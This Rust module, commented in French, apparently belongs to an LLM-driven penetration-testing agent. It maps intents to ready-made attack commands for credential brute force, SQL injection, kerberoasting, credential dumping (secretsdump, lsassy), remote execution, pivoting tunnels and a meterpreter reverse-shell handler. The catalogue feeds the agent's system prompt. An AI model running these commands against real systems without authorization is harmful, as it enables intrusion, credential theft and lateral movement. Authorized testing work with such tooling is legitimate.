//! Registre de capacités — auto-sélection d'outil par intention
//!
//! Le LLM raisonne en **intentions** (« fuzzer le web », « casser ce hash »,
//! « énumérer les partages SMB ») et non en binaires : le binaire réellement
//! utilisable dépend de ce qui est installé sur la machine d'opération. Ce
//! registre fait le pont :
//!
//! ```text
//!   intention (texte libre) ──► capacité ──► candidats ordonnés
//!                                            └─► premier outil présent dans le PATH
//!                                                + gabarit d'arguments adapté à la cible
//! ```
//!
//! Conséquence : l'agent n'a plus besoin que le LLM devine le nom exact du
//! binaire ni sa ligne d'arguments. Il annonce ce qu'il veut faire, le registre
//! choisit le meilleur outil disponible et construit la commande ; si aucun
//! candidat n'est présent, on retombe sur le premier (que `--auto-install`
//! pourra alors installer) avec un message explicite.

#![allow(dead_code)]

use crate::installer::which_in_path;

/// Un binaire candidat et son gabarit d'arguments.
///
/// Placeholders reconnus dans `args` :
///   `{host}` `{port}` `{target}` `{url}` `{wordlist}` `{passlist}` `{userlist}`
#[derive(Debug, Clone, Copy)]
pub struct ToolSpec {
    pub bin: &'static str,
    pub args: &'static str,
}

/// Une capacité : une intention opérationnelle et les outils qui la réalisent.
#[derive(Debug, Clone, Copy)]
pub struct Capability {
    pub id: &'static str,
    pub label: &'static str,
    /// Mots-clés (minuscules) déclenchant la capacité — le plus long gagne.
    pub intents: &'static [&'static str],
    /// Outils candidats, du plus au moins préféré.
    pub tools: &'static [ToolSpec],
    /// Port par défaut de la capacité, utilisé quand la cible n'en fournit pas.
    pub default_port: u16,
}

// ── Catalogue ────────────────────────────────────────────────────────────────

pub const ALL_CAPABILITIES: &[Capability] = &[
    Capability {
        id: "port_scan",
        label: "scan de ports",
        intents: &[
            "scan de port", "scan de ports", "port scan", "scan port", "scan réseau",
            "découverte de port", "découvrir les ports", "balayage", "mapper le réseau",
            "nmap", "masscan",
        ],
        tools: &[
            ToolSpec { bin: "nmap",    args: "-Pn -sS -T4 --top-ports 1000 {host}" },
            ToolSpec { bin: "masscan", args: "-p1-65535 --rate 1000 {host}" },
            ToolSpec { bin: "naabu",   args: "-host {host} -top-ports 1000 -silent" },
        ],
        default_port: 0,
    },
    Capability {
        id: "service_fingerprint",
        label: "empreinte de service",
        intents: &[
            "fingerprint", "empreinte", "détection de version", "version de service",
            "bannière", "identifier le service", "détecter le service",
        ],
        tools: &[
            ToolSpec { bin: "nmap", args: "-Pn -sV -sC -p {port} {host}" },
        ],
        default_port: 80,
    },
    Capability {
        id: "web_dir_fuzz",
        label: "fuzzing de répertoires",
        intents: &[
            "fuzz web", "fuzzing", "fuzz", "brute force répertoire",
            "énumération de répertoire", "énumération de chemin", "découverte de chemin",
            "fichiers cachés", "répertoires cachés", "ffuf", "gobuster", "feroxbuster",
            "dirb", "dirbuster",
        ],
        tools: &[
            ToolSpec { bin: "ffuf",        args: "-u {url}/FUZZ -w {wordlist} -mc 200,204,301,302,307,401,403 -t 40 -s" },
            ToolSpec { bin: "feroxbuster", args: "-u {url} -w {wordlist} -q --no-state" },
            ToolSpec { bin: "gobuster",    args: "dir -u {url} -w {wordlist} -q" },
            ToolSpec { bin: "dirb",        args: "{url} {wordlist} -S" },
        ],
        default_port: 80,
    },
    Capability {
        id: "web_scan",
        label: "analyse de vulnérabilités web",
        intents: &[
            "scan web", "analyse web", "vulnérabilité web", "nikto", "scanner le site",
            "audit web",
        ],
        tools: &[
            ToolSpec { bin: "nikto",   args: "-h {url} -maxtime 120s -nointeractive" },
            ToolSpec { bin: "whatweb", args: "-a 3 {url}" },
        ],
        default_port: 80,
    },
    Capability {
        id: "web_crawl",
        label: "exploration web (crawl)",
        intents: &[
            "crawl", "crawler", "spider", "explorer le site", "katana", "gospider",
            "cartographier le site",
        ],
        tools: &[
            ToolSpec { bin: "katana",   args: "-u {url} -silent -d 3 -jc" },
            ToolSpec { bin: "gospider", args: "-s {url} -q -d 3" },
        ],
        default_port: 80,
    },
    Capability {
        id: "vhost_enum",
        label: "énumération d'hôtes virtuels",
        intents: &[
            "vhost", "hôte virtuel", "hôtes virtuels", "virtual host",
        ],
        tools: &[
            ToolSpec { bin: "ffuf", args: "-u {url} -H \"Host: FUZZ.{host}\" -w {wordlist} -mc 200,301,302,403 -s" },
        ],
        default_port: 80,
    },
    Capability {
        id: "sql_injection",
        label: "injection SQL",
        intents: &[
            "injection sql", "sqli", "sql injection", "sqlmap", "injecter du sql",
        ],
        tools: &[
            ToolSpec { bin: "sqlmap", args: "-u {url} --batch --level 2 --risk 1 --random-agent" },
        ],
        default_port: 80,
    },
    Capability {
        id: "credential_brute",
        label: "bruteforce d'authentification",
        intents: &[
            "bruteforce", "brute force", "brute-force", "password spray", "credential stuffing",
            "attaque par dictionnaire", "deviner le mot de passe", "hydra", "medusa", "ncrack",
        ],
        tools: &[
            ToolSpec { bin: "hydra",  args: "-l admin -P {passlist} -f -t 4 {host} -s {port}" },
            ToolSpec { bin: "medusa", args: "-h {host} -u admin -P {passlist} -t 4 -f" },
            ToolSpec { bin: "ncrack", args: "-U {userlist} -P {passlist} {host}:{port}" },
        ],
        default_port: 22,
    },
    Capability {
        id: "hash_crack",
        label: "cassage de hash",
        intents: &[
            "cassage de hash", "casser un hash", "casser le hash", "crack", "hashcat",
            "john the ripper", "john", "crackage", "cassage",
        ],
        tools: &[
            ToolSpec { bin: "hashcat", args: "-m 0 -a 0 -O --force {hashfile} {wordlist}" },
            ToolSpec { bin: "john",    args: "--wordlist={wordlist} --format=raw-md5 {hashfile}" },
        ],
        default_port: 0,
    },
    Capability {
        id: "snmp_enum",
        label: "énumération SNMP",
        intents: &[
            "snmp", "oid", "communauté snmp", "mib", "snmpwalk",
        ],
        tools: &[
            ToolSpec { bin: "snmpwalk",   args: "-v2c -c public {host}" },
            ToolSpec { bin: "snmp-check", args: "{host} -c public" },
            ToolSpec { bin: "onesixtyone", args: "-c {wordlist} {host}" },
        ],
        default_port: 161,
    },
    Capability {
        id: "ldap_enum",
        label: "énumération LDAP",
        intents: &[
            "ldap", "annuaire", "bind dn", "énumération ldap", "annuaire ldap",
        ],
        tools: &[
            ToolSpec { bin: "ldapsearch", args: "-x -H ldap://{host}:{port} -s base namingcontexts" },
            ToolSpec { bin: "nmap",       args: "-Pn -p {port} --script ldap-rootdse,ldap-search {host}" },
        ],
        default_port: 389,
    },
    Capability {
        id: "smb_enum",
        label: "énumération SMB",
        intents: &[
            "smb", "partage", "partages", "share", "shares", "enum4linux", "netbios",
            "liste des partages", "crackmapexec", "nxc",
        ],
        tools: &[
            ToolSpec { bin: "nxc",          args: "smb {host} --shares" },
            ToolSpec { bin: "smbmap",       args: "-H {host}" },
            ToolSpec { bin: "smbclient",    args: "-L {host} -N" },
            ToolSpec { bin: "enum4linux-ng", args: "-A {host}" },
        ],
        default_port: 445,
    },
    Capability {
        id: "subdomain_enum",
        label: "énumération de sous-domaines",
        intents: &[
            "sous-domaine", "sous-domaines", "subdomain", "énumération dns", "osint dns",
            "subfinder", "amass",
        ],
        tools: &[
            ToolSpec { bin: "subfinder", args: "-d {host} -silent" },
            ToolSpec { bin: "amass",     args: "enum -passive -d {host}" },
        ],
        default_port: 0,
    },
    Capability {
        id: "tls_scan",
        label: "analyse TLS/SSL",
        intents: &[
            "tls", "ssl", "certificat", "chiffrement", "ciphers", "sslscan", "testssl",
        ],
        tools: &[
            ToolSpec { bin: "sslscan",   args: "{host}:{port}" },
            ToolSpec { bin: "testssl.sh", args: "{host}:{port}" },
            ToolSpec { bin: "testssl",   args: "{host}:{port}" },
        ],
        default_port: 443,
    },
    Capability {
        id: "web_vuln_scan",
        label: "scan de vulnérabilités applicatives",
        intents: &[
            "scan de vulnérabilité web", "scan applicatif", "audit cms", "audit applicatif",
            "nuclei", "wpscan", "wordpress", "wapiti", "droopescan", "templates de vulnérabilité",
        ],
        tools: &[
            ToolSpec { bin: "nuclei",    args: "-u {url} -silent -severity critical,high,medium" },
            ToolSpec { bin: "wpscan",    args: "--url {url} --enumerate vp,vt,u --no-banner --disable-tls-checks" },
            ToolSpec { bin: "wapiti",    args: "-u {url} -f txt --flush-session -q" },
            ToolSpec { bin: "droopescan", args: "scan drupal -u {url}" },
        ],
        default_port: 80,
    },
    Capability {
        id: "dns_enum",
        label: "énumération DNS",
        intents: &[
            "zone transfer", "axfr", "dnsrecon", "dnsenum", "fierce", "enregistrements dns",
            "résolution dns", "transfert de zone",
        ],
        tools: &[
            ToolSpec { bin: "dnsrecon", args: "-d {host} -t std,axfr" },
            ToolSpec { bin: "dnsenum",  args: "--threads 5 {host}" },
            ToolSpec { bin: "fierce",   args: "--domain {host}" },
            ToolSpec { bin: "dig",      args: "axfr @{host} {host}" },
        ],
        default_port: 53,
    },
    Capability {
        id: "smtp_enum",
        label: "énumération SMTP",
        intents: &[
            "smtp", "énumération smtp", "vrfy", "utilisateurs smtp", "relais ouvert",
        ],
        tools: &[
            ToolSpec { bin: "smtp-user-enum", args: "-M VRFY -U {userlist} -t {host}" },
            ToolSpec { bin: "nmap",           args: "-Pn -p {port} --script smtp-enum-users,smtp-open-relay {host}" },
            ToolSpec { bin: "swaks",          args: "--server {host} --quit-after EHLO" },
        ],
        default_port: 25,
    },
    Capability {
        id: "pivot_tunnel",
        label: "pivot / tunnel",
        intents: &[
            "pivot", "tunnel", "rebond", "proxy socks", "chisel", "ligolo", "socat",
            "port forwarding", "redirection de port",
        ],
        tools: &[
            ToolSpec { bin: "chisel",   args: "client {target} R:socks" },
            ToolSpec { bin: "ligolo-ng", args: "agent -connect {target} -ignore-cert" },
            ToolSpec { bin: "socat",    args: "TCP-LISTEN:1080,fork,reuseaddr TCP:{host}:{port}" },
            ToolSpec { bin: "ssh",      args: "-N -D 1080 -o StrictHostKeyChecking=no {host}" },
        ],
        default_port: 22,
    },
    Capability {
        id: "kerberos_tooling",
        label: "outillage Kerberos/AD",
        intents: &[
            "kerberos", "kerberoast", "as-rep", "asrep", "kerbrute", "bloodhound",
            "énumération ad", "fspn", "spn", "roasting",
        ],
        tools: &[
            ToolSpec { bin: "kerbrute",              args: "userenum --dc {host} -d {host} {userlist}" },
            ToolSpec { bin: "impacket-GetUserSPNs",  args: "{host}/ -usersfile {userlist} -outputfile diapile_tgs.txt" },
            ToolSpec { bin: "impacket-GetNPUsers",   args: "{host}/ -no-pass -usersfile {userlist} -outputfile diapile_asrep.txt" },
            ToolSpec { bin: "bloodhound-python",     args: "-c All -d {host} -ns {host} --zip" },
        ],
        default_port: 88,
    },
    Capability {
        id: "adcs_enum",
        label: "énumération ADCS",
        intents: &[
            "adcs", "certificat ad", "certipy", "petitpotam", "esc1", "esc8", "ad cs",
            "services de certificat",
        ],
        tools: &[
            ToolSpec { bin: "certipy",     args: "find -dc-ip {host} -vulnerable -stdout" },
            ToolSpec { bin: "petitpotam",  args: "{host}" },
        ],
        default_port: 389,
    },
    Capability {
        id: "remote_exec",
        label: "exécution distante",
        intents: &[
            "exécution distante", "psexec", "wmiexec", "evil-winrm", "winrm", "shell distant",
            "smbexec", "atexec",
        ],
        tools: &[
            ToolSpec { bin: "evil-winrm",        args: "-i {host}" },
            ToolSpec { bin: "impacket-psexec",   args: "{host}" },
            ToolSpec { bin: "impacket-wmiexec",  args: "{host}" },
            ToolSpec { bin: "nxc",               args: "smb {host} -x whoami" },
        ],
        default_port: 445,
    },
    Capability {
        id: "credential_dump",
        label: "extraction d'identifiants",
        intents: &[
            "dump de credentials", "secretsdump", "récupération de hash", "dump sam", "dump lsa",
            "lsassy", "dcsync", "extraction de hash",
        ],
        tools: &[
            ToolSpec { bin: "impacket-secretsdump", args: "{host}" },
            ToolSpec { bin: "nxc",                  args: "smb {host} --sam --lsa" },
            ToolSpec { bin: "lsassy",               args: "{host}" },
        ],
        default_port: 445,
    },
    Capability {
        id: "web_screenshot",
        label: "capture d'écran web",
        intents: &[
            "capture d'écran", "screenshot", "gowitness", "eyewitness", "aquatone",
            "capture de site",
        ],
        tools: &[
            ToolSpec { bin: "gowitness",  args: "scan single -u {url}" },
            ToolSpec { bin: "eyewitness", args: "--web --single {url} --no-prompt" },
        ],
        default_port: 80,
    },
    Capability {
        id: "c2_launch",
        label: "lancement de canal C2",
        intents: &[
            "beacon", "sliver", "meterpreter", "canal de commande", "serveur c2", "canal c2",
            "handler", "écoute inversée",
        ],
        tools: &[
            ToolSpec { bin: "msfconsole",   args: "-q -x \"use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST {host}; set LPORT {port}; run\"" },
            ToolSpec { bin: "sliver-client", args: "--help" },
        ],
        default_port: 4444,
    },
    Capability {
        id: "exploit_search",
        label: "recherche d'exploit",
        intents: &[
            "recherche d'exploit", "searchsploit", "exploit-db", "base d'exploits",
            "trouver un exploit",
        ],
        tools: &[
            ToolSpec { bin: "searchsploit", args: "--colour never {host}" },
        ],
        default_port: 0,
    },
    Capability {
        id: "packet_capture",
        label: "capture de trafic",
        intents: &[
            "capture réseau", "capture de paquets", "tcpdump", "tshark", "sniffing",
            "analyse de trafic",
        ],
        tools: &[
            ToolSpec { bin: "tcpdump", args: "-i any -nn -c 200 host {host} -w diapile_capture.pcap" },
            ToolSpec { bin: "tshark",  args: "-i any -c 200 -f \"host {host}\"" },
        ],
        default_port: 0,
    },
];

// ── Sélection ────────────────────────────────────────────────────────────────

/// Choisit la capacité dont les mots-clés collent le mieux au texte fourni.
///
/// Le score est la somme des longueurs des mots-clés trouvés : un mot-clé
/// spécifique (« énumération de répertoire ») pèse plus qu'un mot générique
/// (« fuzz »), ce qui évite qu'une intention précise soit captée par une
/// capacité trop large.
pub fn match_intent(text: &str) -> Option<&'static Capability> {
    let hay = text.to_lowercase();
    let mut best: Option<(&'static Capability, usize)> = None;

    for cap in ALL_CAPABILITIES {
        let score: usize = cap
            .intents
            .iter()
            .filter(|k| hay.contains(*k))
            .map(|k| k.chars().count())
            .sum();
        if score > 0 && best.map(|(_, s)| score > s).unwrap_or(true) {
            best = Some((cap, score));
        }
    }

    best.map(|(c, _)| c)
}

/// Retourne le gabarit d'arguments d'un binaire donné dans une capacité.
pub fn spec_for(cap: &'static Capability, bin: &str) -> Option<&'static ToolSpec> {
    cap.tools.iter().find(|t| t.bin.eq_ignore_ascii_case(bin))
}

/// Sélectionne le meilleur outil disponible d'une capacité.
///
/// Retourne `(gabarit, présent_dans_le_path)`. Si aucun candidat n'est présent,
/// on retourne tout de même le premier afin que `--auto-install` puisse tenter
/// de l'installer ; le drapeau `false` permet à l'appelant d'afficher un indice.
pub fn select(cap: &'static Capability) -> (&'static ToolSpec, bool) {
    for spec in cap.tools {
        if which_in_path(spec.bin) {
            return (spec, true);
        }
    }
    (&cap.tools[0], false)
}

/// Construit la ligne d'arguments d'un gadrebarit pour une cible donnée, puis la
/// découpe comme un shell (les valeurs entre guillemets restent intactes).
pub fn render_args(spec: &ToolSpec, target: &str, port: u16) -> Vec<String> {
    let host = host_of(target);
    let scheme = if port == 443 || port == 8443 {
        "https"
    } else {
        "http"
    };
    let url = match (scheme, port) {
        ("http", 80) | ("https", 443) | ("http", 0) | ("https", 0) => format!("{scheme}://{host}"),
        _ => format!("{scheme}://{host}:{port}"),
    };
    let target_full = if port == 0 {
        host.clone()
    } else {
        format!("{host}:{port}")
    };

    let expanded = spec
        .args
        .replace("{url}", &url)
        .replace("{host}", &host)
        .replace("{port}", &port.to_string())
        .replace("{target}", &target_full)
        .replace("{wordlist}", &default_wordlist())
        .replace("{passlist}", &default_passlist())
        .replace("{userlist}", &default_userlist())
        // `{hashfile}` n'est pas dérivable : on le vide, le découpage shell
        // éliminera alors le jeton vide plutôt que de passer un faux chemin.
        .replace("{hashfile}", "");

    shell_split(&expanded)
}

/// Extrait l'hôte d'une cible `[schema://]host[:port][/chemin]`.
fn host_of(target: &str) -> String {
    let t = target.trim();
    let t = t.split_once("://").map(|(_, r)| r).unwrap_or(t);
    let t = t.split(['/', '?', '#']).next().unwrap_or(t);
    // Retrait d'un éventuel port (mais on garde les IPv6 entre crochets).
    if t.starts_with('[') {
        return t
            .split(']')
            .next()
            .map(|s| format!("{s}]"))
            .unwrap_or_else(|| t.to_string());
    }
    t.split(':').next().unwrap_or(t).to_string()
}

/// Découpe une chaîne d'arguments comme un shell (guillemets simples/doubles),
/// sans substitution ni expansion.
pub fn shell_split(s: &str) -> Vec<String> {
    let mut out: Vec<String> = Vec::new();
    let mut cur = String::new();
    let mut quote: Option<char> = None;

    for c in s.chars() {
        match quote {
            Some(q) if c == q => quote = None,
            Some(_) => cur.push(c),
            None if c == '"' || c == '\'' => quote = Some(c),
            None if c.is_whitespace() => {
                if !cur.is_empty() {
                    out.push(std::mem::take(&mut cur));
                }
            }
            None => cur.push(c),
        }
    }
    if !cur.is_empty() {
        out.push(cur);
    }
    out
}

/// Rend le catalogue sous forme compacte, destiné au prompt système : le LLM
/// sait ainsi exactement quelles intentions sont reconnues et quels outils
/// peuvent les réaliser, sans qu'on ait à énumérer les binaires à sa place.
pub fn render_catalog() -> String {
    let mut out = String::new();
    for cap in ALL_CAPABILITIES {
        let bins: Vec<&str> = cap.tools.iter().map(|t| t.bin).collect();
        out.push_str(&format!(
            "   • {} [{}] → {}\n",
            cap.label,
            cap.id,
            bins.join(", ")
        ));
    }
    out
}

// ── Listes de référence ──────────────────────────────────────────────────────

/// Première liste de mots présente sur le système, sinon un nom conventionnel.
pub fn default_wordlist() -> String {
    first_existing(
        &[
            "/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt",
            "/usr/share/seclists/Discovery/Web-Content/common.txt",
            "/usr/share/wordlists/dirb/common.txt",
            "/usr/share/dirb/wordlists/common.txt",
            "/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt",
        ],
        "common.txt",
    )
}

/// Liste de mots de passe la plus probable.
pub fn default_passlist() -> String {
    first_existing(
        &[
            "/usr/share/wordlists/rockyou.txt",
            "/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt",
            "/usr/share/seclists/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt",
        ],
        "passwords.txt",
    )
}

/// Liste d'identifiants la plus probable.
pub fn default_userlist() -> String {
    first_existing(
        &[
            "/usr/share/seclists/Usernames/top-usernames-shortlist.txt",
            "/usr/share/wordlists/metasploit/unix_users.txt",
            "/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt",
        ],
        "users.txt",
    )
}

fn first_existing(paths: &[&str], fallback: &str) -> String {
    for p in paths {
        if std::path::Path::new(p).exists() {
            return (*p).to_string();
        }
    }
    fallback.to_string()
}

// ── Tests ────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn intention_web_fuzz_resolue() {
        let cap = match_intent("je veux fuzzer les répertoires du site web").unwrap();
        assert_eq!(cap.id, "web_dir_fuzz");
    }

    #[test]
    fn intention_precise_prime_sur_generique() {
        // « énumération de répertoire » (spécifique) doit battre « fuzz » (générique).
        let cap = match_intent("fuzz et énumération de répertoire cachés").unwrap();
        assert_eq!(cap.id, "web_dir_fuzz");
    }

    #[test]
    fn intention_sql() {
        assert_eq!(
            match_intent("tester une injection SQL sur le paramètre id")
                .unwrap()
                .id,
            "sql_injection"
        );
    }

    #[test]
    fn render_args_expansion() {
        let spec = ToolSpec {
            bin: "x",
            args: "-u {url}/FUZZ -w {wordlist} -h {host}:{port}",
        };
        let args = render_args(&spec, "10.0.0.5", 8080);
        assert_eq!(args[0], "-u");
        assert_eq!(args[1], "http://10.0.0.5:8080/FUZZ");
        assert_eq!(args[2], "-w");
        assert!(args[3].ends_with("common.txt") || args[3].ends_with(".txt"));
        assert_eq!(args[5], "10.0.0.5:8080");
    }

    #[test]
    fn render_args_port_standard_omet_le_port() {
        let spec = ToolSpec {
            bin: "x",
            args: "{url}",
        };
        assert_eq!(
            render_args(&spec, "example.com", 80)[0],
            "http://example.com"
        );
        assert_eq!(
            render_args(&spec, "example.com", 443)[0],
            "https://example.com"
        );
    }

    #[test]
    fn host_of_retire_schema_port() {
        assert_eq!(host_of("http://10.0.0.1:8080/admin"), "10.0.0.1");
        assert_eq!(host_of("10.0.0.1"), "10.0.0.1");
    }

    #[test]
    fn catalogue_etendu_resout_les_nouvelles_intentions() {
        assert!(
            ALL_CAPABILITIES.len() >= 26,
            "catalogue trop pauvre : {}",
            ALL_CAPABILITIES.len()
        );
        assert_eq!(
            match_intent("lancer nuclei sur le site").unwrap().id,
            "web_vuln_scan"
        );
        assert_eq!(
            match_intent("faire un kerberoast sur le DC").unwrap().id,
            "kerberos_tooling"
        );
        assert_eq!(
            match_intent("établir un pivot socks via chisel")
                .unwrap()
                .id,
            "pivot_tunnel"
        );
        assert_eq!(
            match_intent("dump de credentials sur le contrôleur")
                .unwrap()
                .id,
            "credential_dump"
        );
    }

    #[test]
    fn catalogue_rendu_liste_les_outils() {
        let c = render_catalog();
        assert!(c.contains("nuclei"));
        assert!(c.contains("hashcat"));
        assert!(c.contains("certipy"));
    }

    #[test]
    fn select_retombe_sur_premier_candidat() {
        let cap = ALL_CAPABILITIES
            .iter()
            .find(|c| c.id == "snmp_enum")
            .unwrap();
        let (spec, _avail) = select(cap);
        assert_eq!(spec.bin, "snmpwalk");
    }
}
